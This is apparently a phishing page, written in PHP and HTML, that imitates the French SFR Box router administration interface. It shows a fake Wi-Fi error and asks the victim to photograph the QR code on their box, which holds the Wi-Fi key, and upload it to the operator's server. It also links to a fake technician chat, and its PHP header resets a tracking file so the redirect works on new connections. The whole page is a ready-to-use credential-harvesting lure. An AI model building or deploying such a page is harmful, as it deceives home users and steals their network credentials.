<?php
// on enlève le fichier vu.txt pour ne pas empécher la redirection sur chrome en cas de nouvelle connexion.
  
$file_pointer = "vu.txt"; 
  
// Use unlink() function to delete a file 
if (!unlink($file_pointer)) { 
    echo ("$file_pointer cannot be deleted due to an error"); 
} 
else { 
    echo (""); 
} 
?>
<!DOCTYPE html>
<html lang="fr">
  <head>
  <meta charset="utf-8">
  <title>Box -&nbsp;Accueil</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="shortcut icon" type="image/ico" href="/imgsfr/header_logo.ico?v=3.4" />
  <link rel="stylesheet" type="text/css" media="screen" href="/csssfr/global.css?v=3.4" />
  <link rel="stylesheet" type="text/css" media="screen" href="/csssfr/index.css?v=3.4" />
  <script type="text/javascript" src="/jssfr/global.js?v=3.4"></script>
  <script type="text/javascript" src="/jssfr/index.js?v=3.4"></script>
  </head>
  <body>
<img src="/imgsfr/header_logo.ico" width="56" height="56"><img src="/imgsfr/bandeau.jpg" width="560" height="200">
  <div id="infos">
  <a id="btn-help" class="btn" href="#help" data-toggle="modal" title="Aide">?</a>
  <table class="notableborder">
  </table>
  </div>
  </div>
  <div class="navbar">
  <div class="navbar-inner">
  <div class="container">
  <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
  <i class="icon-list-alt  icon-white"></i>&nbsp;Menu
  </a>
  <div class="nav-collapse collapse">
  <ul class="nav">
  <li id="id_state_tab" class="dropdown">
  <a class="dropdown-toggle" id="btn-state" data-toggle="dropdown" href="#" title="Etat">
  Etat
  <b class="caret caret-right"></b>
  </a>
  <ul class="dropdown-menu">
  <li class="tab_on">
  <a href="" title="Général">Général</a>
  </li>
  <li class="tab_off">
  <a href="" title="Internet">Internet</a>
  </li>
  <li class="tab_off">
  <a href="" title="Réseau local">Réseau local</a>
  </li>
  <li class="tab_off">
  <a href="" title="Périphériques">Périphériques</a>
  </li>
  </ul>
  </li>
  <li id="id_network_tab" class="dropdown">
  <a class="dropdown-toggle" id="btn-network" data-toggle="dropdown" href="#" title="Réseau v4">
  Réseau v4
  <b class="caret caret-right"></b>
  </a>
  <ul class="dropdown-menu">
  <li class="tab_on">
  <a href="" title="Général">Général</a>
  </li>
  <li class="tab_off">
  <a href="" title="WAN">WAN</a>
  </li>
  <li class="tab_off">
  <a href="" title="DynDNS">DynDNS</a>
  </li>
  <li class="tab_off">
  <a href="" title="DNS">DNS</a>
  </li>
  <li class="tab_off">
  <a href="" title="DHCP">DHCP</a>
  </li>
  <li class="tab_off">
  <a href="" title="NAT">NAT</a>
  </li>
  <li class="tab_off">
  <a href="" title="Route">Route</a>
  </li>
  <li class="tab_off">
  <a href="" title="Filtrage">Filtrage</a>
  </li>
  </ul>
  </li>
  <li id="id_networkv6_tab" class="dropdown">
  <a class="dropdown-toggle" id="btn-networkv6" data-toggle="dropdown" href="#" title="Réseau v6">
  Réseau v6
  <b class="caret caret-right"></b>
  </a>
  <ul class="dropdown-menu">
  <li class="tab_on">
  <a href="" title="Général">Général</a>
  </li>
  <li class="tab_off">
  <a href="" title="WAN">WAN</a>
  </li>
  <li class="tab_off">
  <a href="" title="Pare-feu">Pare-feu</a>
  </li>
  <li class="tab_off">
  <a href="" title="DHCP">DHCP</a>
  </li>
  <li class="tab_off">
  <a href="" title="SLAAC">SLAAC</a>
  </li>
  <li class="tab_off">
  <a href="" title="DNS">DNS</a>
  </li>
  </ul>
  </li>
  <li id="id_wifi_tab" class="dropdown">
  <a class="dropdown-toggle" id="btn-wifi" data-toggle="dropdown" href="#" title="Wifi">
  Wifi
  <b class="caret caret-right"></b>
  </a>
  <ul class="dropdown-menu">
  <li class="tab_on">
  <a href="" title="Général">Général</a>
  </li>
  <li class="tab_off">
  <a href="" title="Configuration">Configuration</a>
  </li>
  <li class="tab_off">
  <a href="" title="Sécurité">Sécurité</a>
  </li>
  <li class="tab_off">
  <a href="" title="Filtrage MAC">Filtrage MAC</a>
  </li>
  <li class="tab_off">
  <a href="" title="Hotspot">Hotspot</a>
  </li>
  <li class="tab_off">
  <a href="" title="Wifi Horaire">Wifi Horaire</a>
  </li>
  </ul>
  </li>
  <li id="id_voip_tab" class="dropdown">
  <a class="dropdown-toggle" id="btn-voip" data-toggle="dropdown" href="#" title="Téléphonie">
  Téléphonie
  <b class="caret caret-right"></b>
  </a>
  <ul class="dropdown-menu">
  <li class="tab_on">
  <a href="" title="Général">Général</a>
  </li>
  <li class="tab_off">
  <a href="" title="Configuration">Configuration</a>
  </li>
  </ul>
  </li>
  <li id="id_service_tab" class="dropdown">
  <a class="dropdown-toggle" id="btn-service" data-toggle="dropdown" href="#" title="Applications">
  Applications
  <b class="caret caret-right"></b>
  </a>
  <ul class="dropdown-menu">
  <li class="tab_on">
  <a href="" title="Général">Général</a>
  </li>
  <li class="tab_off">
  <a href="" title="Partage de fichiers">Partage de fichiers</a>
  </li>
  <li class="tab_off">
  <a href="" title="Partage d'imprimantes">Partage d'imprimantes</a>
  </li>
  <li class="tab_off">
  <a href="" title="Serveur multimédia">Serveur multimédia</a>
  </li>
  <li class="tab_off">
  <a href="" title="Contrôle d'accès">Contrôle d'accès</a>
  </li>
  </ul>
  </li>
  <li id="id_maintenance_tab" class="dropdown">
  <a class="dropdown-toggle" id="btn-maintenance" data-toggle="dropdown" href="#" title="Maintenance">
  Maintenance
  <b class="caret caret-right"></b>
  </a>
  <ul class="dropdown-menu">
  <li class="tab_on">
  <a href="" title="Général">Général</a>
  </li>
  <li class="tab_off">
  <a href="" title="Système">Système</a>
  </li>
  <li class="tab_off">
  <a href="" title="Administration">Administration</a>
  </li>
  <li class="tab_off">
  <a href="" title="Ligne xDSL">Ligne xDSL</a>
  </li>
  <li class="tab_off">
  <a href="" title="Diagnostic">Diagnostic</a>
  </li>
  <li class="tab_off">
  <a href="" title="Tests">Tests</a>
  </li>
  </ul>
  </li>
  <li id="id_eco_tab" class="dropdown">
  <a class="dropdown-toggle" id="btn-eco" data-toggle="dropdown" href="#" title="Eco">
  Eco
  <b class="caret caret-right"></b>
  </a>
  <ul class="dropdown-menu">
  <li class="tab_on">
  <a href="" title="Général">Général</a>
  </li>
  <li class="tab_off">
  <a href="" title="Configuration">Configuration</a>
  </li>
  </ul>
  </li>
  </ul>
  <ul class="nav pull-right">
  </ul>
  </div>
  </div>
  </div>
  </div>
  <div id="main">
<div class="homeheader " >
  <h1 class="text-center"><img src="/imgsfr/icon_clock.png?v=3.4" alt=""/>&nbsp;Informations</h1>
  <div class="clearfix">
  <div class="pull-left">
  <table>
  <caption><a href=""><img src="/imgsfr/icon_wan.png?v=3.4" alt=""/></a>&nbsp;Connexion</caption>
  <tr>
  <th scope="row">Statut de l'accès</th>
  <td id="wan_status" class="enabled">
  Internet opérationnel
  </td>
  </tr>
  <tr>
  <th scope="row">Temps d'accès</th>
  <td id="wan_uptime">
  Réseau introuvable.
  </td>
  </tr>
  <tr>
  <th scope="row">Profil d'accès</th>
  <td>
  Non disponible
  </td>
  </tr>
  <tr>
  <th>Adresse IPv4</th>
  <td>
  Non disponible
  </td>
  </tr>
  </table>
  </div>
  <div class="pull-right">
  <table>
  <caption><a href=""><img src="/imgsfr/icon_box.png?v=3.4" alt=""/></a>&nbsp;Informations modem</caption>
  <tr>
  <th scope="row">Modèle</th>
  <td>NB6VAC-FXC-r0</td>
  </tr>
  <tr>
  <th scope="row">Temps de service</th>
  <td id="modem_uptime">
  Réseau introuvable
  </td>
  </tr>
  <tr>
  <th scope="row">Version principale</th>
  <td>NBVAC-MAIN-R4.0.35</td>
  </tr>
  <tr>
  <th scope="row">Version de secours</th>
  <td>NBVAC-MAIN-R4.0.33</td>
  </tr>
  <tr>
  <th scope="row">Version driver DSL</th>
  <td>NBVAC-FIBRE-A2pv6F039p</td>
  </tr>
  </table>
  <table>
  <caption><img src="/imgsfr/icon_tv.png?v=3.4" alt=""/>&nbsp;TV</caption>
  <tr>
  <th>Décodeur(s) détecté(s)</th>
  <td>1</td>
  </tr>
  <tr>
  <th>STB7</th>
  <td class="enabled">&nbsp;</td>
  </tr>
  </table>
  </div>
  </div>
</div>
<p>Code erreur 109: une erreur est survenue sur le réseau wifi.</p>
<br>
<br>
<body>
<p>Veuillez vous connecter en prenant en photo le QR code qui s'affiche sur votre box.<b>Cette méthode permet de connecter l'ensemble de vos équipements sans avoir à taper la clé de sécurité wifi pour chacun d'eux.</b>Le QR code est inscrit sur une étiquette derrière ou dessous votre Box de SFR.
<br>
<br>		
	<br>
	<center><IMG class="displayed" src="qrcode.png"></center>
	<br>
	<br>
<p style="color:#808080;">Appuyez sur le bouton <b style='color:red;'>Choisir un fichier</b> ci-dessous pour prendre photo le QR code <b style='color:red;'>en évitant les mouvements.</b>Une fois la photo prise, vous devez appuyer sur <b style='color:red;'>Upload.</b>Si ça ne fonctionne pas et que votre navigateur internet n'est pas compatible, ne fermez pas cette fenêtre et utilisez l'appareil photo de votre mobile pour prendre en photo le QR code.Ensuite, revenez à cette fenêtre et choisissez l'image correspondante dans votre galerie puis valider en appuyant sur <b style='color:red;'>Upload.</b></p>
<div class="container">
<div class="row">
<div class="col-md-8">
<form id="form" action="ajaxupload.php" method="post" enctype="multipart/form-data">
<input id="uploadImage" type="file" name="image" />
<div id="preview"><img src="filed.png" /></div><br>
<input class="btn btn-success" type="submit" value="Upload">
</form>
<div id="err"></div>
<hr>
</br>
<p>Besoin d'une aide supplémentaire ? un technicien peut vous venir en aide: </strong> <a href="/shout/sfrtchat.php" target="_blank"><u>aide en ligne</u> ...</a>
<div class="homefooter">
  <h1 class="text-center"><img src="/img/icon_device.png?v=3.4" alt=""/>&nbsp;Equipements et services</h1>
  <div class="row-fluid">
  <div id="welcome" class="span12 text-center">Bienvenue sur l'interface de configuration de votre Box de SFR.<br/> Accédez directement à tous vos services, depuis un Smartphone, tablette ou PC.</div>
  </div>
  <div class="row-fluid">
  <div class="span3">
  <table>
  <caption>
  <span><a href=""><img src="/imgsfr/icon_ethernet.png?v=3.4" alt=""/>&nbsp;<a class="unstyle" href="">Liaison Ethernet</span>
  <br />
  <span class="text-tiny">1 Poste(s) connecté(s)</span>
  </caption>
  <thead>
  <tr>
  <th>#</th>
  <th>Poste(s) connecté(s)</th>
  </tr>
  </thead>
  <tbody>
  <tr>
  <td>1</td>
  <td>STB7 décodeur TV</td>
  </tr>
  </tbody>
  </table>
  </div>
  <div class="span3">
  <table>
  <caption><a href=""><img src="/imgsfr/icon_wan.png?v=3.4" alt=""/></a>&nbsp;Connexion</caption>
  <tbody>
  <tr>
  <th>SSID 2G</th>
  <td>SFR</td>
  <td id="wlan_status" class="enabled">
  </tr>
  <tr>
  <th>Clé</th>
  <td>**********</td>
  </tr>
  <tr>
  <th>SSID 5G</th>
  <td>SFR_5GHZ</td>
  <td id="wlan_status_ac" class="enabled"></td>
  </tr>
  <tr>
  <th>Clé</th>
  <td>**********</td>
  </tr>
  </tbody>
  </table>
  <table class="stack">
  <thead>
  <tr>
  <th>#</th>
  <th>Poste(s) connecté(s)</th>
  </tr>
  </thead>
  <tbody>
  <tr>
  <td>1</td>
  <td>Vous</td>
  </tr>
  </tbody>
  </table>
  </div>
  <div class="span3">
  <table>
  <caption>
  <a href="/voip"><img src="/imgsfr/icon_voip.png?v=3.4" alt=""/></a>&nbsp;<a class="unstyle" href="/voip">Téléphonie</a>
  <br />
  </caption>
  <tr>
  <th>Ligne</th>
  <td class="enabled">
  Active
  </td>
  </tr>
  <tr>
  <th>Combiné</th>
  <td class="enabled">
  Raccroché
  </td>
  </tr>
  <tr>
  <th>Filtrage d'appels</th>
  <td class="disabled">
  Désactivé
  </td>
  </tr>
  <tr>
  <th>Notif. d'appel manqué</th>
  <td class="disabled">
  Désactivé
  </td>
  </tr>
  </table>
  </div>
  <div class="span3">
  <table>
  <caption>
  <a href="/service"><img src="/img/icon_service.png?v=3.4" alt=""/></a>&nbsp;<a class="unstyle" href="/service">Services</a>
  <br />
  <span class="text-tiny">&nbsp;</span>
  </caption>
  <tbody>
  <tr>
  <th>Partage de fichiers</th>
  <td class="disabled">&nbsp;</td>
  </tr>
  <tr>
  <th>Partage d'imprimantes</th>
  <td class="disabled">&nbsp;</td>
  </tr>
  <tr>
  <th>Serveur multimédia</th>
  <td class="disabled">&nbsp;</td>
  </tr>
  <tr>
  <th>Contrôle d'accès</th>
  <td class="disabled">&nbsp;</td>
  </tr>
  </tbody>
  </table>
  </div>
  </div>
</div>
  </div>
  <div id="help" class="modal hide fade">
  <div class="modal-header">
  <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
  <h3>Aide</h3>
  </div>
  <div class="modal-body">
  <p>Bienvenue sur l'interface de configuration de votre box. Accédez directement à tous vos services, depuis un Smartphone, tablette ou PC. Cette page vous permet d’avoir une vue globale des équipements et services de votre box.</p>
  </div>
  <div class="modal-footer">
  </div>
  </div>
  <script type="text/javascript">
  $(document).ready(function(){
  $('a[href=#help]').show();
  });
  </script>
	</body>
</html>

